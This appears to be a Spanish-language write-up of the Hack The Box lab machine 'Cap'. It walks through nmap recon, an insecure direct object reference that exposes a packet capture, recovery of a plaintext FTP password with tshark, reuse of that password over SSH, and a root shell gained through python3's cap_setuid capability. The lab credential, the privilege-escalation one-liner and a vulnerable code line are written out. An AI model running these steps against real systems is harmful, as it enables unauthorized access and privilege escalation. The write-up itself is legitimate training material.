---
title: 'Cap'
description: 'WriteUp de la máquina Cap'
pubDate: 'Jun 26 2025'
heroImage: '/htb/cap/placeholder.png'
private: false
category: 'writeups'
tags: ['htb', 'web', 'broken access control', 'capabilities', 'credential reuse', 'network log review']
---

## Fase de reconocimiento
### Puertos y servicios
Comenzamos con un escaneo de puertos para identificar los servicios disponibles en la máquina, luego hacer un escaneo de vulnerabilidades con `nmap` para obtener más información sobre los servicios, con la flag `-sV` para detectar versiones de los servicios y `-sC` para ejecutar los scripts de nmap por defecto.

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 
...
80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos un servicio FTP al cual podemos probar a acceder como usuario `anonymous`, pero no es necesario, ya que los scripts de nmap `-sC` ejecutan este análisis y en caso de existir, nos lo indicaría.

### Servicio web
Antes de acceder al servicio web, podemos ver que se está ejecutando un servidor [Gunicorn](https://gunicorn.org/), esto nos dice que es un servidor para aplicaciones en Python, por lo cual sabemos que la aplicación web está desarrollada en este lenguaje.

Una vez accedemos al servicio, podemos ver que es un dashboard con una sesión ya iniciada, como "nathan". Esto debemos tenerlo en cuenta, ya que posiblemente también sea un usuario del sistema.

![Dashboard](/htb/cap/dashboard.png)

Revisando las distintas pestañas del dashboard, vemos una que nos llama la atención, "Security Snapshot (5 Second PCAP + Analysis)". Al acceder, vemos en la URL que se está accediendo al registro número 1 (`/data/1`), y viendo los datos, notamos que no hay registros en las distintas secciones, al menos para ese registro. Podemos probar cambiando ese ID por 2, 3, etc., y no vemos nada. Sin embargo, si indicamos el ID 0, vemos que sí hay registros, por lo que descargamos el archivo `pcap` que nos proporcionan.


### Analizando el pcap
Los archivos pcap son archivos de captura de paquetes, que contienen información sobre el tráfico de red. Podemos abrirlos con Wireshark para analizarlos o con tshark desde la terminal. En este caso usaremos tshark.

#### Usando tshark
Al leer el archivo, podemos ver que hay mucho tráfico, tanto HTTP como FTP
```shell
$ tshark -r 0.pcap

  1   0.000000 192.168.196.1 → 192.168.196.16 TCP 68 54399 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM
  2   0.000027 192.168.196.16 → 192.168.196.1 TCP 68 80 → 54399 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460 SACK_PERM WS=128
  3   0.000190 192.168.196.1 → 192.168.196.16 TCP 62 54399 → 80 [ACK] Seq=1 Ack=1 Win=1051136 Len=0
  4   0.000241 192.168.196.1 → 192.168.196.16 HTTP 454 GET / HTTP/1.1 
  5   0.000246 192.168.196.16 → 192.168.196.1 TCP 56 80 → 54399 [ACK] Seq=1 Ack=399 Win=64128 Len=0
  6   0.001742 192.168.196.16 → 192.168.196.1 TCP 73 HTTP/1.0 200 OK 
  7   0.001858 192.168.196.16 → 192.168.196.1 HTTP 1434 HTTP/1.0 200 OK  (text/html)
  8   0.002121 192.168.196.1 → 192.168.196.16 TCP 62 54399 → 80 [ACK] Seq=399 Ack=1397 Win=1049600 Len=0
  9   0.002208 192.168.196.1 → 192.168.196.16 TCP 62 54399 → 80 [FIN, ACK] Seq=399 Ack=1397 Win=1049600 Len=0
  10   0.002222 192.168.196.16 → 192.168.196.1 TCP 56 80 → 54399 [ACK] Seq=1397 Ack=400 Win=64128 Len=0
  ...
```

Para filtrar el tráfico HTTP, podemos usar la siguiente flag `-Y`:
```shell
$ tshark -r 0.pcap -Y http

  4   0.000241 192.168.196.1 → 192.168.196.16 HTTP 454 GET / HTTP/1.1 
  7   0.001858 192.168.196.16 → 192.168.196.1 HTTP 1434 HTTP/1.0 200 OK  (text/html)
  14   0.042529 192.168.196.1 → 192.168.196.16 HTTP 416 GET /static/main.css HTTP/1.1 
  17   0.044465 192.168.196.16 → 192.168.196.1 HTTP 1047 HTTP/1.0 200 OK  (text/css)
  24   0.448205 192.168.196.1 → 192.168.196.16 HTTP 408 GET /favicon.ico HTTP/1.1 
  27   0.449869 192.168.196.16 → 192.168.196.1 HTTP 425 HTTP/1.0 404 NOT FOUND  (text/html)
```

Esto nos muestra solo consultas GET sin nada que nos sirva. Probamos ahora con el tráfico FTP:
```shell
$ tshark -r 0.pcap -Y ftp

  34   2.626895 192.168.196.16 → 192.168.196.1 FTP 76 Response: 220 (vsFTPd 3.0.3)
  36   4.126500 192.168.196.1 → 192.168.196.16 FTP 69 Request: USER nathan
  38   4.126630 192.168.196.16 → 192.168.196.1 FTP 90 Response: 331 Please specify the password.
  40   5.424998 192.168.196.1 → 192.168.196.16 FTP 78 Request: PASS Buck3tH4TF0RM3!
  42   5.432387 192.168.196.16 → 192.168.196.1 FTP 79 Response: 230 Login successful.

  ...
```
Acá ya podemos ver una contraseña en texto claro para el usuario `nathan`, que es `Buck3tH4TF0RM3!`.

## Fase de explotación
### Accediendo al servicio FTP
Con las credenciales obtenidas, podemos acceder al servicio FTP, y ver la flag del usuario
```shell
$ ftp 10.129.35.0
Connected to 10.129.35.0.
220 (vsFTPd 3.0.3)

ftp> dir
229 Entering Extended Passive Mode (|||24816|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Jun 25 15:04 user.txt
226 Directory send OK.
```

### Accediendo al servicio SSH
Siempre es recomendable intentar acceder al servicio SSH con las mismas credenciales, ya que muchas veces se reutilizan en distintos servicios, y en este caso no es la excepción:

```shell
$ ssh nathan@10.129.35.0
```

Una vez accedemos, yo siempre recomiendo hacer un tratamiento de la terminal para poder usar `Ctrl+C`, `Ctrl+L`, etc., y también para poder listar siempre con los ficheros ocultos. Para ello ejecutamos el siguiente comando:
```shell
export TERM=xterm; export SHELL=bash; alias ll="ls -lha";
```
## Fase de escalado de privilegios
### Buscando escalado de privilegios
Una vez accedimos, ahora necesitamos poder escalar privilegios. En todas las máquinas yo recomiendo revisar en primera instancia la existencia de otros usuarios con acceso a bash, ya que esto nos da pistas sobre si escalamos directamente a root o debemos revisar otros usuarios. Para ello usamos:
```shell
$ cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
nathan:x:1001:1001::/home/nathan:/bin/bash
``` 
Solo vemos a nathan y a root, por lo cual sabemos que el escalado es directo.

Teniendo la contraseña del usuario, podemos revisar los permisos de sudo, para ello usamos el comando `sudo -l`, y vemos que no tiene permisos, por lo cual debemos buscar otra forma de escalar privilegios.

### Buscando capabilities
Una de las formas de escalar privilegios es buscando programas con capabilities. Para ello ejecutamos:
```shell
$ getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
Encontramos bastantes. La que más nos interesa es la de Python, que tiene `cap_setuid`, lo que nos permite modificar nuestro UID por el que queramos, en este caso root. Para una lista completa de capabilities útiles, podemos revisar [GTFOBins](https://gtfobins.github.io).

### Escalando privilegios con python
Para escalar privilegios, podemos usar el siguiente comando:
```shell
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Esto nos permite ejecutar un comando como root. En este caso abrimos una shell de bash y listo, ya tenemos acceso a root y podemos ver la flag en `/root/root.txt`.

## Notas finales
### Otra forma de encontrar la capability de python
En la máquina, si no hubiéramos ejecutado el comando `getcap`, podríamos haber encontrado esta pista en el archivo web `/var/www/html/app.py`, ya que en la función `capture()` vemos cómo se setea el UID para capturar tráfico:

```python3
command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
```

## Conclusión
En esta máquina aprendimos a revisar los Broken Access Control, ya que muchas veces nos permiten acceder a información sensible, como en este caso, la contraseña del usuario `nathan`, que nos permitió acceder al servicio SSH y posteriormente escalar privilegios a root.

También a utilizar herramientas como `tshark` para analizar capturas y filtrar por lo que nos interesa (HTTP y FTP), y cómo el uso de capabilities en programas como Python nos permite escalar privilegios de forma sencilla sin explotar vulnerabilidades complejas.

Espero que este writeup te haya sido de ayuda y que hayas aprendido algo nuevo. ¡Gracias por leer!